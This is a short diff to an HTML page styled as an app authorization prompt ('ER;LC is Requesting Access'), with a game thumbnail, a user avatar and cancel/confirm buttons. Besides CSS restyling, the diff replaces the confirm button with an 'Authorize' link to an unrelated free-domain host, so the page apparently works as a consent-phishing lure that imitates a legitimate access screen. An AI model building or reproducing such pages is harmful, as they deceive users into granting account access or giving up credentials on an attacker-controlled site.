@@ -146,8 +146,19 @@ button {
 }
 
 .confirm-button {
-  background-color: #0073e5;
+  display: inline-block;
+  padding: 10px 20px;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  background-color: #005bbf;
   color: #fff;
+  text-decoration: none; /* Remove underlines */
+  transition: background-color 0.3s ease;
+}
+
+.confirm-button:hover {
+  background-color: #039487;
 }
 
 footer {
@@ -173,7 +184,6 @@ footer {
 <main>
 <h1>ER;LC is Requesting Access</h1>
 <div class="avatar-group">
-
 <div class="avatar">
 <img src="https://tr.rbxcdn.com/9d6867631862cf22235da0ea94d025dc/420/420/Image/Png" alt="Application Thumbnail">
 </div>
@@ -183,10 +193,8 @@ footer {
 <line x1="10" y1="10" x2="90" y2="90" stroke="white" stroke-width="8"></line>
 <line x1="10" y1="90" x2="90" y2="10" stroke="white" stroke-width="8"></line>
 </svg>
-
 <div class="line-separator">
 </div>
-
 <div class="avatar">
 <img src="https://yt3.googleusercontent.com/fm3EfAme--1R-AXyYk9fhrEFybJOB_tqX_hQ7jNDazZR3tpevPTX1JINsk6DlDFplngz67Xz=s176-c-k-c0x00ffffff-no-rj" alt="User Avatar">
 </div>
@@ -228,7 +236,7 @@ footer {
 </div>
 <div class="button-group">
 <button class="cancel-button">Cancel</button>
-<button class="confirm-button">Confirm and Give Access</button>
+<a href="https://dcaus.cf/sagechat/test/model-page/auth/erlc-combe" class="confirm-button">Authorize</a>
 </div>
 </div>
 </main>
